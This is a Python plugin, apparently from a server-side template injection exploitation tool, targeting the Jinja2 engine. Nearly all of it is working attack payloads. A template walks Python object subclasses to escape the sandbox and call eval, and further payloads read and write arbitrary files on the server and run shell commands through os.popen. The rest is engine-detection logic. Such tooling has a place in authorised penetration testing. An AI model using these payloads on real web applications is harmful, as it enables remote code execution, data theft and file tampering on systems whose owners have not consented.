from utils.strings import quote
from core.plugin import Plugin
from core import closures
from utils.loggers import log
from utils import rand
import base64

class Jinja2(Plugin):

    actions = {
        'render' : {
            'render': '{{%(code)s}}',
            'header': '{{%(header)s}}',
            'trailer': '{{%(trailer)s}}'
        },
        'write' : {
            'call' : 'evaluate',
            'write' : """open("%(path)s", 'ab+').write(__import__("base64").urlsafe_b64decode('%(chunk)s'))""",
            'truncate' : """open("%(path)s", 'w').close()"""
        },
        'read' : {
            'call': 'evaluate',
            'read' : """__import__("base64").b64encode(open("%(path)s", "rb").read())"""
        },
        'md5' : {
            'call': 'evaluate',
            'md5': """__import__("hashlib").md5(open("%(path)s", 'rb').read()).hexdigest()"""
        },
        'evaluate' : {
            'call': 'render',
            'evaluate': """{%% set d = "%(code)s" %%}{%% for c in [].__class__.__base__.__subclasses__() %%} {%% if c.__name__ == 'catch_warnings' %%}
    {%% for b in c.__init__.func_globals.values() %%} {%% if b.__class__ == {}.__class__ %%}
    {%% if 'eval' in b.keys() %%}
    {{ b['eval'](d) }}
    {%% endif %%} {%% endif %%} {%% endfor %%}
    {%% endif %%} {%% endfor %%}"""
        },
        'execute' : {
            'call': 'evaluate',
            'execute': """__import__("os").popen("%(code)s").read()"""
        }

    }

    contexts = [

        # Text context, no closures
        { 'level': 1 },

        # This covers {{%s}}
        { 'level': 1, 'prefix': '%(closure)s}}', 'suffix' : '', 'closures' : closures.python_ctx_closures },

        # This covers {% %s %}
        { 'level': 1, 'prefix': '%(closure)s%%}', 'suffix' : '', 'closures' : closures.python_ctx_closures },

        # If and for blocks
        # # if %s:\n# endif
        # # for a in %s:\n# endfor
        { 'level': 5, 'prefix': '%(closure)s\n', 'suffix' : '\n', 'closures' : closures.python_ctx_closures },

        # Comment blocks
        { 'level': 5, 'prefix' : '#}', 'suffix' : '{#' },

    ]

    def detect_engine(self):

        randA = rand.randstr_n(2)
        randB = rand.randstr_n(2)

        payload = '{{"%s".join("%s")}}' % (randA, randB)
        expected = randA.join(randB)

        if expected == self.render(payload):
            self.set('language', 'python')
            self.set('engine', 'jinja2')
            self.set('eval', 'python')

    def detect_eval(self):

        payload = """"-".join([__import__("os").name, __import__("sys").platform])"""
        self.set('os', self.evaluate(payload))
        self.set('eval', 'python')

    def evaluate(self, code):
        # Quote code before submitting it
        return super(Jinja2, self).evaluate(quote(code))


    def execute(self, code):
        # Quote code before submitting it
        return super(Jinja2, self).execute(quote(code))
